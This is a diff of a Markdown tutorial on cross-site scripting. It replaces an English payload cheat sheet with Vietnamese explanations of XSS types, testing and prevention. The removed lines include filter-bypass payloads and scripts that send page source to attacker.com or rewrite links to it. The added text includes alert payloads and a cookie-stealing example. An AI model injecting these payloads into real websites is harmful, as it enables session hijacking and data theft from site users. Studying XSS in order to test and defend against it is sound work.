@@ -27,105 +27,124 @@ Tấn công Cross Site Scripting nghĩa là gửi và chèn lệnh và script đ
 - Trên các trang web có quảng cáo được hiển thị.
 - Email độc hại được gửi đến nạn nhân. Tấn công xảy ra khi tin tặc tìm kiếm những lỗ hổng trên website và gửi nó làm đầu vào độc hại. Tập lệnh độc hại được tiêm vào mã lệnh và sau đó được gửi dưới dạng đầu ra cho người dùng cuối cùng.
 
-Chúng ta hãy phân tích một ví dụ đơn giản sau đây: Tưởng tượng chúng ta có 1 trang web với trường Search.
+Chúng ta hãy phân tích một ví dụ đơn giản sau đây: Tưởng tượng chúng ta có 1 trang web với chức năng Search.
 
-Nếu trường Search là trường có lỗ hổng, khi người dùng nhập bất kỳ đoạn script thì nó sẽ được thực thi.
+Nếu chức năng Search có lỗ hổng, khi người dùng nhập bất kỳ đoạn script thì nó sẽ được thực thi.
 
+**Ví dụ 1:** Người dùng nhập đoạn script đơn giản như sau:
+![example](1.png)
+
+Lúc đó sau khi nhấn nút “Search”, script được nhập sẽ được thực hiện.
+
+![example](2.png)
+
+Như chúng ta thấy trong Ví dụ, script đã nhập vào trường Search được thực thi. Điều này chỉ cho thấy lỗ hổng của cuộc tấn công XSS. Tuy nhiên, một tập lệnh có hại hơn cũng có thể được nhập. Nhiều Tester kết hợp tấn công Cross Site Scripting với Javascript Injection, cũng đang được thực hiện ở phía client. Trong cả hai, các script tấn công độc hại đang được tiêm. Tuy nhiên, trong trường hợp tấn công XSS, các thẻ < script > không cần thiết để thực thi script.
+
+**Ví dụ 2:** Hãy xem xét rằng trong trường review nếu hacker nhập đoạn code sau:
+
+**< script >destroyWebsite();< /script>**
+
+Sau đó, hàm destroyWebsite() sẽ được gọi và nó sẽ thực hiện các hành động có hại của nó. Như hầu hết chúng ta biết, cuộc tấn công này chủ yếu được sử dụng để thu thập cookie của người khác, có thể được sử dụng để đăng nhập bằng các danh tính khác. Hãy để chúng tôi phân tích một ví dụ khác về kịch bản XSS có thể có với hành vi trộm cắp cookie có thể xảy ra.
+
+**Ví dụ 3:** thông qua lỗ hổng của website, tin tặc sẽ tiêm mã thích hợp.
+
+**< script type=”text/javascript”>Var test=’../example.php?cookie_data=’+escape(docuent.cookie);< /script>**
+
+Như đã thấy trong Ví dụ trên, cookie bị mất và được gửi tới biến ‘cookie_data’ của tập lệnh mẫu example.php. Nếu hacker sẽ chèn tập lệnh này vào mã của trang web, thì mã sẽ được thực thi trong trình duyệt của người dùng và cookie sẽ được gửi tới hacker.
 
 ### Types of Attacks
 
-#### Reflected XSS
-Case: `<tag>You searched for $input. </tag>`
+Có 3 loại tấn công XSS chính như sau:
 
-```
-<svg onload=alert()>
-</tag><svg onload=alert()>
-```
+### Reflected XSS
+
+Reflected XSS là dạng tấn công thường gặp nhất trong các loại hình XSS. Với Reflected XSS, hacker không gửi dữ liệu độc hại lên server nạn nhân, mà gửi trực tiếp link có chứa mã độc cho người dùng, khi người dùng click vào link này thì trang web sẽ được load chung với các đoạn script độc hại.
+
+Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách được biết đến nhiều nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được quyền của họ trên website. Chi tiết được mô tả qua những bước sau:
+
+![example](3.png)
+
+**Ví dụ:** Ta có thể thấy lỗi Reflected XSS trong chức năng tìm kiếm của website này. Khi tìm kiếm dữ liệu, website trả về dữ liệu mà mình nhập vào. Từ đó ta có thể sử dụng lỗi reflected xss để tấn công trang web này bằng lệnh: < script>alert(1)< /script> 
+
+![example](4.png)
 
 #### Stored XSS
 
-Case: `<tag attribute="$input">`
+Khác với Reflected tấn công trực tiếp vào một số nạn nhân mà hacker nhắm đến, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi lưu vào cơ sở dữ liệu (ở đây tôi dùng khái niệm này để chỉ database, file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.
 
-```
-"><svg onload=alert()>
-"><svg onload=alert()><b attr="
-" onmouseover=alert() "
-"onmouseover=alert()//
-"autofocus/onfocus="alert()
-```
+Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.
+
+![example](5.png)
+
+Kịch bản khai thác:
+
+![example](6.png)
+
+
+Reflected XSS và Stored XSS có 2 sự khác biệt lớn trong quá trình tấn công.
+Thứ nhất, để khai thác Reflected XSS, hacker phải lừa được nạn nhân truy cập vào URL của mình. Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được mã nguy hiểm vào CSDL của ứng dụng, hacker chỉ việc ngồi chờ nạn nhân tự động truy cập vào. Với nạn nhân, việc này là hoàn toàn bình thường vì họ không hề hay biết dữ liệu mình truy cập đã bị nhiễm độc.
+
+Thứ hai, mục tiêu của hacker sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công nạn nhân vẫn trong phiên làm việc(session) của ứng dụng web. Với Reflected XSS, hacker có thể thuyết phục hay lừa nạn nhân đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. Nhưng Stored XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào người dùng truy cập các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này người dùng vẫn đang trong phiên làm việc.
+
+Từ những điều này có thể thấy Stored XSS nguy hiểm hơn Reflected XSS rất nhiều, đối tượng bị ảnh hưởng có thế là tất cả nhưng người sử dụng ứng dụng web đó. Và nếu nạn nhân có vai trò quản trị thì còn có nguy cơ bị chiếm quyền điều khiển web.
+
+
 #### DOM Based XSS
-Case: `<script> var new something = '$input'; </script>`
 
-```
-'-alert()-'
-'-alert()//'
-'}alert(1);{'
-'}%0Aalert(1);%0A{'
-</script><svg onload=alert()>
-```
+DOM-based XSS là nơi lỗ hổng bảo mật tồn tại trong mã phía client chứ không phải mã phía server. Hình thức này dùng để khai thác XSS dựa vào việc thay đổi HTML của tài liệu, hay nói cách khác là thay đổi cấu trúc DOM.
+
+DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML. 
+ 
+Trong ví dụ dưới đây ta có thể sử dụng DOM Based XSS để thay đổi cấu trúc của câu lệnh tìm kiếm: ">< svg onload=alert(1)>
+
+![example](7.png)
 
 ### Attack Testing
-Yep, confirm because alert is too mainstream.
-```
-confirm()
-confirm``
-(confirm``)
-{confirm``}
-[confirm``]
-(((confirm)))``
-co\u006efirm()
-new class extends confirm``{}
-[8].find(confirm)
-[8].map(confirm)
-[8].some(confirm)
-[8].every(confirm)
-[8].filter(confirm)
-[8].findIndex(confirm)
-```
+ 
+Trước tiên, để kiểm thử tấn công XSS, kiểm thử hộp đen có thể được thực hiện. Nó có nghĩa là, chúng ta có thể test mà không cần xem xét code. Tuy nhiên, xem xét code luôn là một việc nên làm và nó mang lại kết quả đáng tin cậy.
+
+Trong khi bắt đầu kiểm thử, Tester nên xem xét phần nào của website là có thể bị tấn công XSS. Tốt hơn là liệt kê chúng trong tài liệu kiểm thử và bằng cách này, bảo đảm chúng ta sẽ không bị bỏ xót. Sau đó, tester nên lập kế hoạch cho các script nào phải được kiểm tra. Điều quan trọng là, kết quả có ý nghĩa gì, ứng dụng đó là dễ bị lỗ hổng và cần được phân tích các kết quả một cách kỹ lưỡng. Trong khi kiểm thử các cuộc tấn công có thể, điều quan trọng là kiểm tra xem nó đang được đáp ứng như thế nào với các kịch bản đã nhập và các kịch bản đó có được thực thi hay không vv.
+
+Ví dụ, tester có thể thử nhập trên trình duyệt đoạn script sau:
+
+< script>alert(document.cookie)< /script>
+
+Nếu script được thực hiện, thì có một khả năng rất lớn, rằng XSS là có thể. Ngoài ra, trong khi kiểm thử thủ công để có thể tấn công Cross Site Scripting, điều quan trọng cần nhớ là các dấu ngoặc được mã hóa cũng nên được thử.
 
 ### Prevent XSS
-##### Replace all links
-```javascript
-Array.from(document.getElementsByTagName("a")).forEach(function(i) {
-  i.href = "https://attacker.com";
-});
-```
-##### Source Code Stealer
-```html
-<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
-```
-A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
+Mặc dù loại tấn công này được coi là một trong những loại nguy hiểm và rủi ro nhất, nhưng vẫn nên chuẩn bị một kế hoạch ngăn ngừa. Bởi vì sự phổ biến của cuộc tấn công này, có khá nhiều cách để ngăn chặn nó.
+
+Các phương pháp phòng ngừa chính được sử dụng phổ biến bao gồm:
+
+Data validation
+Filtering
+Escaping
+Bước đầu tiên trong công tác phòng chống tấn công này là Xác thực đầu vào. Mọi thứ, được nhập bởi người dùng phải được xác thực chính xác, bởi vì đầu vào của người dùng có thể tìm đường đến đầu ra. Xác thực dữ liệu có thể được đặt tên làm cơ sở để đảm bảo tính bảo mật của hệ thống. Tôi sẽ nhắc nhở rằng ý tưởng xác thực không cho phép đầu vào không phù hợp. Vì vậy nó chỉ giúp giảm thiểu rủi ro, nhưng có thể không đủ để ngăn chặn lỗ hổng XSS có thể xảy ra.
+
+Một phương pháp ngăn chặn tốt khác là lọc đầu vào của người dùng. Ý tưởng lọc là tìm kiếm các từ khóa nguy hiểm trong mục nhập của người dùng và xóa chúng hoặc thay thế chúng bằng các chuỗi trống. Những từ khóa đó có thể là:
+
+Thẻ < script> < /script>
+
+Lệnh Javascript
+
+Đánh dấu HTML
+
+Lọc đầu vào khá dễ thực hành. Nó có thể được thực hiện theo nhiều cách khác nhau. Như:
+
+Bởi các developers đã viết mã phía server.
+
+Thư viện ngôn ngữ lập trình thích hợp đang được sử dụng.
+
+Trong trường hợp này, một số developer viết mã riêng của họ để tìm kiếm các từ khóa thích hợp và xóa chúng. Tuy nhiên, cách dễ dàng hơn là chọn thư viện ngôn ngữ lập trình thích hợp để lọc đầu vào của người dùng. Tôi muốn lưu ý rằng việc sử dụng thư viện là một cách đáng tin cậy hơn, vì các thư viện đó đã được nhiều nhà phát triển sử dụng và thử nghiệm.
+
+Một phương pháp phòng ngừa khác có thể là ký tự Escape. Trong thực tế này, các ký tự thích hợp đang được thay đổi bằng các mã đặc biệt.
+
+Ví dụ: < ký tự Escape có thể giống như & # 60. Điều quan trọng cần biết là chúng ta có thể tìm thấy các thư viện thích hợp với ký tự escape.
+
+Trong khi đó, việc kiểm thử tốt cũng không nên quên điều đó. Chúng ta cần những kiểm thử phần mềm có kiến thức tốt và những công cụ kiểm thử phần mềm đáng tin cậy. Bằng cách này, chất lượng phần mềm sẽ được bảo đảm tốt hơn.
 ###  In conclusion
-If nothing of this works, take a look at **Awesome Bypassing** section
 
-First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of reflections.
-<br>Now for attribute context, check if double quotes (") are being filtered by entering `x"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>
-If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
-<br>For javascript context, check which quotes are being used for example if they are doing
-```
-variable = 'value' or variable = "value"
-```
-Now lets say single quotes (') are in use, in that case enter `x'd3v`. If it gets altered to `x\'d3v`, try escaping the backslash (\) by adding a backslash to your probe i.e. `x\'d3v`. If it works use the following payload:
-```
-\'-alert()//
-```
-But if it gets altered to `x\\\'d3v`, the only thing you can try is closing the script tag itself by using
-```
-</script><svg onload=alert()>
-```
-For simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potential filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using
-```
-<svg onload=alert()//
-```
-or this (it will not work in all cases)
-```
-<svg onload=alert()
-```
-If the your dummy tags lands in the source code as it is, go for any of these payloads
-```
-<svg onload=alert()>
-<embed src=//14.rs>
-<details open ontoggle=alert()>
-```
+Trong khi thực hiện kiểm thử, Tester nên đánh giá các rủi ro mang lại từ các cuộc tấn công XSS có thể xảy ra. Tấn công XSS có thể ảnh hưởng đến các ứng dụng web, nó được coi là một trong những cuộc tấn công nguy hiểm và nguy hiểm nhất. Do đó, chúng ta không nên quên kiểm thử tấn công XSS này.
 
+Trong khi thực hiện kiểm thử đối với XSS, điều quan trọng là phải có kiến thức tốt về tấn công XSS. Và đây là cơ sở để phân tích kết quả kiểm thử một cách chính xác và chọn các công cụ kiểm tra thích hợp. Qua bài viết, hi vọng các bạn có thể hiểu rõ hơn về tầm quan trọng của kiểm thử tấn công XSS và cách để thực hiện kiểm thử nó hiệu quả hơn.
